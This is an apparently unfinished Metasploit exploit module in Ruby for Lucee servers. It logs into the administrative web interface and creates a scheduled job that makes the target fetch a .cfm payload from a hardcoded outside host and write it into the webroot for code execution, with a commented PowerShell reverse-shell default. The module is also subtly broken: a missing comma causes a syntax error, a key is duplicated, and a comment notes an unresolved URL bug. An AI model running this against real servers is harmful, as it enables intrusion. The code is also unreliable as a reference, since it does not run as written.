class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Lucee Authenticated Scheduled Job Code Execution',
        'Description' => %q{
          This module can be used to execute a payload on Lucee servers that have an exposed
          administrative "Web" interface. It's possible for an administrator to create a
          scheduled job that queries a Cold Fusion file, which is then downloaded and executed
          when accessed. The payload is uploaded as a cfm file when queried by the target server.

          NOTE: The compatible payload sets vary based on the selected target. For
          example, you must select the Windows target to use native Windows payloads.
        },
        'References' => [['CVE','None']]
        'Targets' => [
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_cmd
              # 'DefaultOptions' => {
              # 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              # }
            }
          ],
        ],
        'Author' => 'Alex Philiotis',
        'License' => MSF_LICENSE,
        'References' => [

        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8888
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [
            # /opt/lucee/server/lucee-server/context/logs/application.log
            # /opt/lucee/web/logs/exception.log
            IOC_IN_LOGS,
            ARTIFACTS_ON_DISK
          ]
        },
        'DisclosureDate' => '2023-02-10'
      )
      )

    register_options(
      [
        OptString.new('PASSWORD', [false, 'The password for the administrative interface']),
        OptString.new('TARGETURI', [true, 'The path to the admin interface.', '/lucee/admin/web.cfm'])
      ]
    )
  end

  def exploit
    authenticate
    create_job
  end

  def authenticate
    auth = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'keep_cookies' => true,
      'vars_post' => {
        'login_passwordweb' => datastore['PASSWORD'],
        'lang' => 'en',
        'rememberMe' => 's',
        'submit' => 'submit'
      }

    })

    if auth && auth.code == 200 && auth.body.include?('nav_Security')
      print_good('Authenticated Successfully')
    else
      print_error('Authentication Failed')
    end
  end

  def create_job
    create_job = send_request_cgi({
      'method' => 'POST',
      'uri' => target_uri.path + '?action=services.schedule&action2=create',
      'keep_cookies' => true,
      'vars_post' => {
        'name' => 'exploit_test',
        'url' => 'http://10.0.0.12:8080/exp.cfm',
        'interval' => '3600',
        'start_day' => '01',
        'start_month' => '02',
        'start_year' => '2023',
        'start_hour' => '00',
        'start_minute' => '00',
        'start_second' => '00',
        'run' => 'create'
      }
    })
    print_good(target_uri.path + create_job.headers['location']) #Issue is that it's got web.cfm in there twice.
    update_job = send_request_cgi({
      'method' => 'POST',
      'uri' => target_uri.path,
      'keep_cookies' => true,
      'vars_post' => {
        'name' => 'exploit_test',
        'url' => 'http://10.0.0.12:8080/exp.cfm',
        'timeout' => '50',
        'username' => '',
        'password' => '',
        'proxyserver' => '',
        'proxyport' => '',
        'proxyuser' => '',
        'proxypassword' => '',
        'publish' => 'true',
        'file' => 'C:\\lucee\\tomcat\\webapps\\ROOT\\exp.cfm',
        'start_day' => '01',
        'start_month' => '02',
        'start_year' => '2023',
        'start_hour' => '00',
        'start_minute' => '00',
        'start_second' => '00',
        'end_day' => '',
        'end_month' => '',
        'end_year' => '',
        'end_hour' => '',
        'end_minute' => '',
        'end_second' => '',
        'interval_hour' => '1',
        'interval_minute' => '0',
        'interval_second' => '0',
        'run' => 'update'
      }
    })

    if create_job && create_job.code == 302
      print_good('Job Created')
    else
      print_error('Job Creation Failed')
    end
  end
end
